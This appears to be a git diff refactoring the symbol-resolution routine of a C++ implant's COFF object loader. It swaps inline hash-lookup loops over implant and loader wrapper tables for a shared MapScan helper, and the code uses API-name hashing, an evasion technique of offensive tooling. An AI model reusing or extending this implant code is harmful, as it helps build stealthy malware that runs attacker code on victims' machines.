@@ -52,26 +52,12 @@ namespace Objects {
         char *library   = { };
         char *function  = { };
 
-        uint32_t lib_hash   = 0;
-        uint32_t fn_hash    = 0;
-
         *pointer = nullptr;
 
         if (Utils::HashStringA(sym_string, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {
+
             function = sym_string + COFF_PREP_BEACON_SIZE;
-
-            for (auto i = 0;; i++) {
-                if (!implant_wrappers[i].name) {
-                    break;
-                }
-
-                if (Utils::HashStringA(function, x_strlen(function)) == implant_wrappers[i].name) {
-                    *pointer = implant_wrappers[i].address;
-                    success_(true);
-                }
-            }
-
-            success_(false);
+            success_(Memory::Scanners::MapScan(implant_wrappers, pointer, Utils::HashStringA(function, x_strlen(function))));
         }
         else if (Utils::HashStringA(sym_string, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
 
@@ -93,12 +79,9 @@ namespace Objects {
 #if _M_IX86
                 IX86_SYM_STRIP(function);
 #endif
-                lib_hash   = Utils::HashStringA(library, x_strlen(library));
-                fn_hash    = Utils::HashStringA(function, x_strlen(function));
-
+                x_assertb(C_PTR_HASHES(*pointer, Utils::HashStringA(library, x_strlen(library)), Utils::HashStringA(function, x_strlen(function))));
                 x_freesplit(split, count);
 
-                x_assertb(C_PTR_HASHES(*pointer, lib_hash, fn_hash));
                 success_(true);
             }
             else {
@@ -106,20 +89,7 @@ namespace Objects {
 #if _M_IX86
                 IX86_SYM_STRIP(function);
 #endif
-                fn_hash = Utils::HashStringA(function, x_strlen(function));
-
-                for (auto i = 0;; i++) {
-                    if (!loader_wrappers[i].name) {
-                        break;
-                    }
-
-                    if (fn_hash == loader_wrappers[i].name) {
-                        *pointer = loader_wrappers[i].address;
-                        success_(true);
-                    }
-                }
-
-                success_(false);
+                success_(Memory::Scanners::MapScan(loader_wrappers, pointer, Utils::HashStringA(function, x_strlen(function))));
             }
         }
         else if (Utils::HashStringA(sym_string, x_strlen(sym_string)) == COFF_INSTANCE) {
